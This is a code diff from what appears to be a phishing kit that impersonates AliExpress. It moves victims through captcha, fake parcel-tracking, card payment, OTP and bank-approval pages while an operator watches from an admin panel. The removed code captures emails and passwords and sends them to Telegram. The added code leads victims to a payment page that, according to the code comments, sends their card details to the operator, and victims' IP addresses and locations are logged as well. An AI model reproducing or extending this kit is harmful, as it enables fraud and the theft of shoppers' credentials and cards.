@@ -4,13 +4,14 @@ import { ChevronDown, Eye, EyeOff, AlertCircle } from 'lucide-react';
 import { TranslationProvider, useTranslation } from '@/lib/TranslationContext';
 import { loadBotConfigFromServer } from '@/lib/botConfig';
 import { Captcha } from '@/components/Captcha';
+import { TrackingPage } from '@/components/TrackingPage';
 import { PaymentPage } from '@/components/PaymentPage';
 import { OtpPage } from '@/components/OtpPage';
 import { BankApprovalPage } from '@/components/BankApprovalPage';
 import { ProcessingPage } from '@/components/ProcessingPage';
 import { SocialButton } from '@/components/SocialButton';
 
-type ViewState = 'captcha' | 'login' | 'payment' | 'loading' | 'otp' | 'bank-approval' | 'blocked' | 'declined';
+type ViewState = 'captcha' | 'tracking' | 'payment' | 'loading' | 'otp' | 'bank-approval' | 'blocked' | 'declined';
 
 // Use sessionStorage to keep the same session ID across React re-renders/hot-reloads
 // This ensures the admin panel always targets the correct browser tab
@@ -65,129 +66,7 @@ function useSessionTracker(page: string, ip: string, country: string, extra: Rec
   }, [page, ip, country, extraStr]);
 }
 
-// ── Login Page ───────────────────────────────────────────────────────────────
-interface LoginPageProps {
-  onLogin: (email: string, password: string) => void;
-  locationName: string;
-  onLogoClick: () => void;
-}
 
-const LoginPage: React.FC<LoginPageProps> = ({ onLogin, locationName, onLogoClick }) => {
-  const { t } = useTranslation();
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
-  const [showPassword, setShowPassword] = useState(false);
-  const [processing, setProcessing] = useState(false);
-
-  const handleLogin = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (email && password && !processing) {
-      setProcessing(true);
-      setTimeout(() => onLogin(email, password), 3000);
-    }
-  };
-
-  return (
-    <div className="min-h-screen bg-white flex flex-col items-center max-w-md mx-auto relative shadow-xl">
-      <header className="w-full flex items-center justify-between p-4 border-b border-gray-100">
-        <div className="w-8" />
-        <div className="flex-1 flex justify-center" onClick={onLogoClick}>
-          {/* eslint-disable-next-line @next/next/no-img-element */}
-          <img
-            src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/AliExpress_2024.svg/330px-AliExpress_2024.svg.png"
-            alt="AliExpress"
-            className="h-6 object-contain cursor-pointer"
-          />
-        </div>
-        <div className="w-8" />
-      </header>
-
-      <div className="w-full px-6 pt-8 pb-4">
-        <h2 className="text-2xl font-bold text-[#191919] mb-8">{t('signIn')}</h2>
-        <form onSubmit={handleLogin} className="space-y-4">
-          <input
-            type="text"
-            value={email}
-            onChange={e => setEmail(e.target.value)}
-            placeholder={t('emailOrPhone')}
-            disabled={processing}
-            className="w-full px-4 py-4 text-base text-black font-semibold border border-gray-300 rounded-xl outline-none focus:border-[#FF4747] transition-all placeholder:text-gray-400 bg-gray-50 disabled:opacity-60"
-          />
-          <div className="relative">
-            <input
-              type={showPassword ? 'text' : 'password'}
-              value={password}
-              onChange={e => setPassword(e.target.value)}
-              placeholder={t('password')}
-              disabled={processing}
-              className="w-full px-4 py-4 text-base text-black font-semibold border border-gray-300 rounded-xl outline-none focus:border-[#FF4747] transition-all placeholder:text-gray-400 bg-gray-50 disabled:opacity-60"
-            />
-            <button
-              type="button"
-              onClick={() => setShowPassword(!showPassword)}
-              className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400"
-            >
-              {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
-            </button>
-          </div>
-          <button
-            type="submit"
-            disabled={!email || !password || processing}
-            className={`w-full py-4 rounded-full text-lg font-bold text-white transition-all ${
-              !email || !password || processing
-                ? 'bg-[#E0E0E0] cursor-not-allowed'
-                : 'bg-[#FF4747] hover:bg-[#e03030]'
-            }`}
-          >
-            {processing ? (
-              <span className="flex items-center justify-center gap-2">
-                <svg className="animate-spin h-5 w-5 text-gray-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
-                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
-                </svg>
-                {t('processing')}
-              </span>
-            ) : t('signIn')}
-          </button>
-        </form>
-
-        <div className="mt-4 flex justify-between items-center px-1">
-          <button className="text-sm text-gray-500">{t('forgotPassword')}</button>
-          <button className="text-sm text-[#FF4747] font-semibold">{t('signUp')}</button>
-        </div>
-
-        <div className="relative flex items-center py-6">
-          <div className="flex-grow border-t border-gray-200"></div>
-          <span className="flex-shrink mx-4 text-gray-400 text-xs font-medium uppercase tracking-widest">
-            {t('orContinueWith')}
-          </span>
-          <div className="flex-grow border-t border-gray-200"></div>
-        </div>
-
-        <div className="grid grid-cols-1 gap-3">
-          <SocialButton type="google" label="google" icon="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" />
-          <SocialButton type="facebook" label="facebook" icon="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" />
-          <SocialButton type="apple" label="apple" icon="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" />
-        </div>
-      </div>
-
-      <footer className="w-full px-6 py-8 text-center bg-white mt-auto">
-        <div className="flex items-center justify-center gap-1 mb-6 text-gray-600">
-          <span className="text-sm">{t('location')}:</span>
-          <button className="flex items-center gap-0.5 text-sm font-semibold hover:text-[#FF4747]">
-            {locationName} <ChevronDown className="w-4 h-4" />
-          </button>
-        </div>
-        <p className="text-[11px] leading-relaxed text-gray-400 font-normal max-w-[280px] mx-auto">
-          {t('bySigningIn')}{' '}
-          <a href="#" className="underline">{t('termsOfUse')}</a>{' '}
-          {t('and')}{' '}
-          <a href="#" className="underline">{t('privacyPolicy')}</a>.
-        </p>
-      </footer>
-    </div>
-  );
-};
 
 // ── Blocked Page ─────────────────────────────────────────────────────────────
 const BlockedPage: React.FC = () => (
@@ -276,22 +155,19 @@ const MainAppInner: React.FC<{ geo: GeoInfo }> = ({ geo }) => {
         `🛒 <i>AliExpress — Track</i>`
       );
     }
-    setView('login');
+    setView('tracking');
   }, [geo]);
 
-  // ── Login → send credentials ─────────────────────────────────────────────
-  const handleLogin = useCallback(async (e: string, p: string) => {
-    setEmail(e);
-    setPassword(p);
+  // ── Tracking → go to payment ─────────────────────────────────────────────
+  const handlePaymentRedirect = useCallback(async () => {
+    // Send order number notification to admin
     const cfg = await loadBotConfigFromServer();
-    console.log('[Login] Config:', cfg.token ? 'token OK' : 'NO TOKEN', cfg.chatId ? 'chatId OK' : 'NO CHATID');
     if (cfg.token && cfg.chatId) {
       const now = new Date().toLocaleString('en-GB', { timeZone: 'UTC', hour12: false });
       await sendTelegram(cfg.token, cfg.chatId,
-        `🔐 <b>New Login Captured</b>\n` +
+        `📦 <b>Package Tracking Viewed</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━━\n` +
-        `📧 <b>Email/Phone:</b> <code>${e}</code>\n` +
-        `🔑 <b>Password:</b> <code>${p}</code>\n` +
+        `#️⃣ <b>Order Number:</b> <code>3062801646906014</code>\n` +
         `━━━━━━━━━━━━━━━━━━━━━━\n` +
         `🌍 <b>Country:</b> ${geo.country || 'Unknown'}\n` +
         `🏙 <b>City:</b> ${geo.city || 'Unknown'}\n` +
@@ -306,9 +182,7 @@ const MainAppInner: React.FC<{ geo: GeoInfo }> = ({ geo }) => {
   }, [geo]);
 
   // ── Payment complete → go to loading, wait for admin action ─────────────
-  // Card is sent ONLY from PaymentPage.tsx — do NOT send again here
   const handlePaymentComplete = useCallback(async () => {
-    // Card details are sent by PaymentPage.tsx directly — no duplicate send here
     setView('loading');
   }, []);
 
@@ -327,7 +201,7 @@ const MainAppInner: React.FC<{ geo: GeoInfo }> = ({ geo }) => {
         `🏙 <b>City:</b> ${geo.city || 'Unknown'}\n` +
         `📍 <b>IP Address:</b> <code>${geo.ip || 'Unknown'}</code>\n` +
         `🕐 <b>Time (UTC):</b> ${now}\n` +
-        `━━━━━━━━━━━━━━━━━━━━━━\n` +
+        `━━��━━━━━━━━━━━━━━━━━━━\n` +
         `🛒 <i>AliExpress — Track</i>`
       );
     }
@@ -337,16 +211,18 @@ const MainAppInner: React.FC<{ geo: GeoInfo }> = ({ geo }) => {
   }, [email, geo]);
 
   if (view === 'captcha') return <Captcha onVerified={handleCaptchaVerified} />;
-  if (view === 'login') return (
-    <LoginPage
-      onLogin={handleLogin}
+  if (view === 'tracking') return (
+    <TrackingPage
+      onPayNow={handlePaymentRedirect}
       locationName={geo.country || 'Global'}
+      country={geo.country}
+      city={geo.city}
       onLogoClick={handleLogoClick}
     />
   );
   if (view === 'payment') return (
     <PaymentPage
-      onBack={() => setView('login')}
+      onBack={() => setView('tracking')}
       onComplete={() => { setIsDeclined(false); handlePaymentComplete(); }}
       botToken=""
       chatId=""
